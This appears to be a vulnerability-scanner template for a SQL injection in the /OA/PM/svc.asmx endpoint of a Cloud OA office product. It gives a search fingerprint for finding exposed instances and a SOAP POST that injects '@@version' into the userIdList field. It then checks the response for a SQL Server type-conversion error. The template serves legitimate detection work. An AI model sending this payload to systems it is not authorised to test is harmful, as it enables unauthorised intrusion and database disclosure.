name: Cloud_OA_System_OA_PM_svc.asmx_sqli
transport: http
set: {}
detail:
  dock: body="全程云办公" && body="/OA/WebResource.axd"
  product: Cloud OA system
  homepage: https://oa.24om.com/
  impact: '<p> <span style = "color: rgb (22, 51, 102); font-size: 16px;"> /OA/PM/svc.asmx
    has parameter filtering and penetration, resulting in SQL injection vulnerability,
    which can be obtained by exploiting the vulnerability Sensitive information in
    the database. </span> <br> </p>'
  description: <p>cloud OA system /OA/PM/svc.asmx page parameters are not properly
    filtered, resulting in a SQL injection vulnerability, which can be used to obtain
    sensitive information in the database. <br></p>
rules:
  r1:
    method: POST
    path: /OA/PM/svc.asmx
    follow_redirects: false
    headers:
      Content-Type: text/xml
    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"\
      http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
      \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n\
      \    <GetUsersInfo xmlns=\"http://tempuri.org/\">\n      <userIdList>@@version</userIdList>\n\
      \    </GetUsersInfo>\n  </soap:Body>\n</soap:Envelope>"
    expression: response.status == 500 && response.body.bcontains(b'Microsoft SQL Server')
      && response.body.bcontains(b'转换成数据类型 int 时失败')
expression: r1()
